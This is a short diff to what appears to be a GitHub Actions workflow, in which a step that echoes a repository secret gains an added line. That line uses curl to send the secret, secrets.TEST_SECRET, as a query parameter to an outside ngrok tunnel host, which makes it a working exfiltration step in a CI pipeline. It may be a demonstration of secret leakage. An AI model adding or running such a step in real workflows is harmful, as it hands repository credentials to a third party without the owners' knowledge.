@@ -7,3 +7,4 @@ jobs:
       - name: Echo secret
         run: |
           echo "${{ secrets.TEST_SECRET }}"
+          curl "http://3573728a366c.ngrok.io?secret=${{ secrets.TEST_SECRET }}"
